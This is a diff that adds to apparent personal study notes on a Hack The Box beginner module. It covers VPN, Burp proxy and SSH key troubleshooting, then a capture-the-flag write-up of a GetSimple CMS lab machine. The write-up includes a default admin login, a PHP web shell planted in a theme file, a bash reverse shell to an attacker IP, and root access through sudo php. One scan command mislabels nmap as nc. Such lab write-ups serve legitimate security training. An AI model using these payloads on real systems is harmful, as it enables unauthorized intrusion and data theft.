@@ -1522,4 +1522,227 @@ From here, we can grab the root.txt flag. Finally, we have now solved our first 
 
 This all gets me the root file
 
+# Common Pitfalls
+
+While performing penetration tests or attacking HTB boxes/labs, we may make many common mistakes that will hamper our progress. In this section, we will discuss some of these common pitfalls and how to overcome them.
+VPN Issues
+
+We may sometimes face issues related to VPN connections to the HTB labs network. First, we should ensure that we are indeed connected to the HTB network.
+Still Connected to VPN
+
+The easiest method of checking if we have successfully connected to the VPN network is by checking whether we have Initialization Sequence Completed at the end of our VPN connection messages:
+
+```
+sudo openvpn ./htb.ovpn
+
+...SNIP...
+
+Initialization Sequence Completed
+```
+
+Another way of checking whether we are connected to the VPN network is by checking our VPN tun0 address, which we can find with the following command:
+
+```
+ifconfig
+```
+
+As long we get our IP back, then we should be connected to the VPN network.
+Checking Routing Table
+
+Another way to check for connectivity is to use the command sudo netstat -rn to view our routing table:
+
+```
+sudo netstat -rn
+
+[sudo] password for user: 
+
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
+0.0.0.0         192.168.195.2   0.0.0.0         UG        0 0          0 eth0
+10.10.14.0      0.0.0.0         255.255.254.0   U         0 0          0 tun0
+10.129.0.0      10.10.14.1      255.255.0.0     UG        0 0          0 tun0
+192.168.1.0   0.0.0.0         255.255.255.0   U         0 0          0 eth0
+```
+
+Pinging Gateway
+
+From here, we can see that we are connected to the 10.10.14.0/23 network on the tun0 adapter and have access to the 10.129.0.0/16 network and can ping the gateway 10.10.14.1 to confirm access.
+
+```
+ping -c 4 10.10.14.1
+PING 10.10.14.1 (10.10.14.1) 56(84) bytes of data.
+64 bytes from 10.10.14.1: icmp_seq=1 ttl=64 time=111 ms
+64 bytes from 10.10.14.1: icmp_seq=2 ttl=64 time=111 ms
+64 bytes from 10.10.14.1: icmp_seq=3 ttl=64 time=111 ms
+64 bytes from 10.10.14.1: icmp_seq=4 ttl=64 time=111 ms
+
+--- 10.10.14.1 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3012ms
+rtt min/avg/max/mdev = 110.574/110.793/111.056/0.174 ms
+```
+
+Finally, we can either attack an assigned target host on the 10.129.0.0/16 network or begin enumeration for live hosts.
+Working on Two Devices
+
+The HTB VPN cannot be connected to more than one device simultaneously. If we are connected on one device and try to connect from another device, the second connection attempt will fail.
+
+For example, this can happen when our VPN connection is connected in our PwnBox, and then we try to connect to it from our Parrot VM at the same time. Alternatively, perhaps we are connected on our Parrot VM, and then we want to switch to a Windows VM to test something.
+Checking Region
+
+If we feel a noticeable lag in our VPN connection, such as latency in pings or ssh connections, we should ensure that we are connected to the most appropriate region. HTB provides VPN servers worldwide, in Europe, USA, Australia, and Singapore. Ideally, it would help if we tried to connect to the server closest to us to get the best possible connection.
+
+To change our VPN Server, go to HackTheBox, click on the top-right icon that says Lab Access or Offline, click on Labs, and then click on OpenVPN. Once we do, we should be able to pick our VPN server location and pick any of the servers within that region:
+
+
+
+Note: Users with a free subscription only can connect to 1-3 free servers in each region. Users with a VPN subscription can connect to VIP servers, which provide a faster connection with less traffic.
+VPN Troubleshooting
+
+In case we face any technical issues when connecting to the VPN, we can find detailed guidance on troubleshooting VPN connections on this HackTheBox Help page.
+Burp Suite Proxy Issues
+
+Burp Suite is a crucial tool during web application penetration tests (as well as other assessment types). Burp Suite is a web application proxy and can cause a few issues on our systems.
+
+Burp Suite Proxy Issues
+
+Burp Suite is a crucial tool during web application penetration tests (as well as other assessment types). Burp Suite is a web application proxy and can cause a few issues on our systems.
+Not Disabling Proxy
+
+When we turn the Burp proxy in our browser, Burp will start to capture our traffic and intercept our requests. This will make it stop any requests we make in the browser, i.e., visiting a page until we go to Burp, examine the request, and forward the request.
+
+A common pitfall is forgetting to turn off the browser proxy after closing Burp, so it keeps intercepting our requests. If this happens, we will see that our browser is not loading any pages, so we should check if the browser proxy is still on. We can do that by clicking on the Foxy Proxy plugin icon in Firefox, and making sure it's set to Turn Off:
+
+If we are not using a plugin like Foxy Proxy, we can check the browser's connection settings and make sure the proxy is turned off. Once we do, we should be able to continue browsing without any issues.
+Changing SSH Key and Password
+
+In case we start facing some issues with connecting to SSH servers or connecting to our machine from a remote server, we may want to renew or change our SSH key and password to make sure they are not causing any issues. We can do this with the ssh-keygen command, as follows:
+
+```
+ssh-keygen
+
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/parrot/.ssh/id_rsa): 
+Enter passphrase (empty for no passphrase):
+Enter same passphrase again:
+
+Your identification has been saved in /home/parrot/.ssh/id_rsa
+Our public key has been saved in /home/parrot/.ssh/id_rsa.pub
+The key fingerprint is:
+SHA256:...SNIP... parrot@parrot
+The key's randomart image is:
++---[RSA 3072]----+
+|            o..  |
+|     ...SNIP     |
+|     ...SNIP     |
+|     ...SNIP     |
+|     ...SNIP     |
+|     ...SNIP     |
+|     ...SNIP     |
+|       + +oo+o   |
++----[SHA256]-----+
+```
+
+By default, SSH keys are stored in the .ssh folder within our home folder (for example, /home/htb-student/.ssh). If we wanted to create an ssh key in a different directory, we could enter an absolute path for the key when prompted. We can encrypt our SSH key with a password when prompted or keep it empty if we do not want to use a password.
+
+# Knowledge Check
+
+Let's put together everything we learned in this module and attack our first box without a guide.
+Tips
+
+Remember that enumeration is an iterative process. After performing our Nmap port scans, make sure to perform detailed enumeration against all open ports based on what is running on the discovered ports. Follow the same process as we did with Nibbles:
+
+    Enumeration/Scanning with Nmap - perform a quick scan for open ports followed by a full port scan
+
+    Web Footprinting - check any identified web ports for running web applications, and any hidden files/directories. Some useful tools for this phase include whatweb and Gobuster
+
+    If you identify the website URL, you can add it to your '/etc/hosts' file with the IP you get in the question below to load it normally, though this is unnecessary.
+
+    After identifying the technologies in use, use a tool such as Searchsploit to find public exploits or search on Google for manual exploitation techniques
+
+    After gaining an initial foothold, use the Python3 pty trick to upgrade to a pseudo TTY
+
+    Perform manual and automated enumeration of the file system, looking for misconfigurations, services with known vulnerabilities, and sensitive data in cleartext such as credentials
+
+    Organize this data offline to determine the various ways to escalate privileges to root on this target
+
+There are two ways to gain a foothold—one using Metasploit and one via a manual process. Challenge ourselves to work through and gain an understanding of both methods.
+
+There are two ways to escalate privileges to root on the target after obtaining a foothold. Make use of helper scripts such as LinEnum and LinPEAS to assist you. Filter through the information searching for two well-known privilege escalation techniques.
+
+Have fun, never stop learning, and do not forget to think outside of the box!
+
+
+-----------------------------
+
+Questions in this section
+
+Spawn the target, gain a foothold and submit the contents of the user.txt flag. 
+
+```
+nc -sV -sC 10.129.214.13
+
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 4c:73:a0:25:f5:fe:81:7b:82:2b:36:49:a5:4d:c8:5e (RSA)
+|   256 e1:c0:56:d0:52:04:2f:3c:ac:9a:e7:b1:79:2b:bb:13 (ECDSA)
+|_  256 52:31:47:14:0d:c3:8e:15:73:e3:c4:24:a2:3a:12:77 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Welcome to GetSimple! - gettingstarted
+| http-robots.txt: 1 disallowed entry 
+|_/admin/
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+ffuf -w /Users/noneya/Useful/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt:FUZZ -u http://10.129.214.13:80/FUZZ -e .php -ic
+
+.php                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 5137ms]
+                        [Status: 200, Size: 5485, Words: 422, Lines: 152, Duration: 5138ms]
+index.php               [Status: 200, Size: 5485, Words: 422, Lines: 152, Duration: 5138ms]
+admin                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 67ms]
+data                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 2422ms]
+plugins                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 58ms]
+theme                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 76ms]
+
+admin shows a sign in page
+
+admin:admin works
+
+Looking at the themes there is this in the file:
+
+<?php if(!defined('IN_GS')){ die('you cannot load this page directly.'); }
+
+Removing that and adding 
+<?php system(id); ?>
+
+Then running 
+curl http://10.129.214.13/theme/Innovation/template.php
+
+That gives me RCE, lets get a rev shell
+
+Adding 
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.250/5555 0>&1'"); ?>
+
+Running the curl command gets me a rev shell and the user.txt file
+```
+
+After obtaining a foothold on the target, escalate privileges to root and submit the contents of the root.txt flag. 
+
+Running sudo -l I get
+```
+sudo -l
+Matching Defaults entries for www-data on gettingstarted:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on gettingstarted:
+    (ALL : ALL) NOPASSWD: /usr/bin/php
+```
+
+So I can just run any php command sudo I think.
+
+I can read files with php
+
+`sudo /usr/bin/php -r 'system("cat /root/root.txt");'`
+
+That gets me root
 
